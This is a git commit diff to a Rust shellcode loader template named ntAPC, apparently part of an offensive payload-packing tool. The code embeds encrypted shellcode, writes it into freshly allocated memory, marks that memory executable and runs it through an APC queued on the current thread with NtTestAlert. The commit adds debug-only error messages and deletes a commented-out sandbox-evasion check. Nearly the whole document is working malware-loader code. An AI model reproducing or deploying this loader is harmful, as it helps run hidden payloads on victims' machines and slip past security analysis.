c6f4f706f14ec7d24e256c795b3cd2a48c308b58
Nariod <dorian.p@pm.me>
2024-04-15 22:13:00 +0200

    Template ntAPC now debug mode compatible

--- templates/ntAPC/src/main.rs
+++ templates/ntAPC/src/main.rs
@@ -1,29 +1,25 @@
 #![windows_subsystem = "windows"] 
 #![allow(non_snake_case)]
 
-use winapi::{
-    um::{
-        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE}
-    },
-    shared::{
-        ntdef::{NT_SUCCESS}
-    }
-};
-use winapi::ctypes::c_void;
-use ntapi::ntpsapi::PPS_APC_ROUTINE;
-use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
-use std::{ptr::null_mut};
-use ntapi::ntpsapi::NtCurrentProcess;
-use ntapi::ntpsapi::NtCurrentThread; 
 use ntapi::ntmmapi::NtAllocateVirtualMemory;
-use ntapi::ntmmapi::NtWriteVirtualMemory;
 use ntapi::ntmmapi::NtProtectVirtualMemory;
+use ntapi::ntmmapi::NtWriteVirtualMemory;
+use ntapi::ntpsapi::NtCurrentProcess;
+use ntapi::ntpsapi::NtCurrentThread;
 use ntapi::ntpsapi::NtQueueApcThread;
 use ntapi::ntpsapi::NtTestAlert;
+use ntapi::ntpsapi::PPS_APC_ROUTINE;
+use std::ptr::null_mut;
+use winapi::ctypes::c_void;
+use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
+use winapi::{
+    shared::ntdef::NT_SUCCESS,
+    um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE},
+};
 //use winapi::um::sysinfoapi::GetPhysicallyInstalledSystemMemory;
 
-
 use std::include_bytes;
+
 {{IMPORTS}}
 
 {{DECRYPTION_FUNCTION}}
@@ -34,7 +30,12 @@ fn enhance(mut buf: Vec<u8>) {
         let mut size : usize = buf.len();
         let alloc_status = NtAllocateVirtualMemory(NtCurrentProcess, &mut allocstart, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if !NT_SUCCESS(alloc_status) {
-            panic!("Error allocating memory to the local process: {}", alloc_status);
+            if cfg!(debug_assertions) {
+                println!("[-] Error calling NtAllocateVirtualMemory: {}", alloc_status);
+                panic!();
+            } else {
+                panic!();
+            }
         }
         
         let mut byteswritten = 0;
@@ -42,19 +43,34 @@ fn enhance(mut buf: Vec<u8>) {
         let mut buffer_length = buf.len();
         let write_status = NtWriteVirtualMemory(NtCurrentProcess, allocstart, buffer, buffer_length, &mut byteswritten);
         if !NT_SUCCESS(write_status) {
-            panic!("Error writing to the local process: {}", write_status);
+            if cfg!(debug_assertions) {
+                println!("[-] Error calling NtWriteVirtualMemory: {}", write_status);
+                panic!();
+            } else {
+                panic!();
+            }
         }
 
         let mut old_perms = PAGE_READWRITE;
         let protect_status = NtProtectVirtualMemory(NtCurrentProcess, &mut allocstart, &mut buffer_length, PAGE_EXECUTE_READWRITE, &mut old_perms);
         if !NT_SUCCESS(protect_status) {
-            panic!("[-] Failed to call NtProtectVirtualMemory: {:#x}", protect_status);
+            if cfg!(debug_assertions) {
+                println!("[-] Error calling NtProtectVirtualMemory: {}", protect_status);
+                panic!();
+            } else {
+                panic!();
+            }
         }
 
         let apc = NtQueueApcThread(NtCurrentThread, Some(std::mem::transmute(allocstart)) as PPS_APC_ROUTINE, allocstart, null_mut(), null_mut());
         // thanks to https://github.com/trickster0/OffensiveRust/blob/c7629a285e8128348d7d7239e25db858064ad0e2/Injection_AES_Loader/src/main.rs
         if !NT_SUCCESS(apc) {
-            panic!("Error failed to call QueueUqerAPC: {}", apc);
+            if cfg!(debug_assertions) {
+                println!("[-] Error calling NtQueueApcThread: {}", apc);
+                panic!();
+            } else {
+                panic!();
+            }
         }
 
         NtTestAlert();
@@ -63,17 +79,7 @@ fn enhance(mut buf: Vec<u8>) {
 
 fn main() {
     let buf = include_bytes!({{PATH_TO_SHELLCODE}});
-    // Removing the sandobox check for now, as it fails on numerous Windows versions.
-    /*
-    let mut memory = 0;
-    unsafe {
-        let is_quicksand = GetPhysicallyInstalledSystemMemory(&mut memory);
-        println!("{:#?}", is_quicksand);
-        if is_quicksand != 1 {
-            panic!("Hello.")
-        }
-    }
-    */
+
     let mut vec: Vec<u8> = Vec::new();
     for i in buf.iter() {
         vec.push(*i);
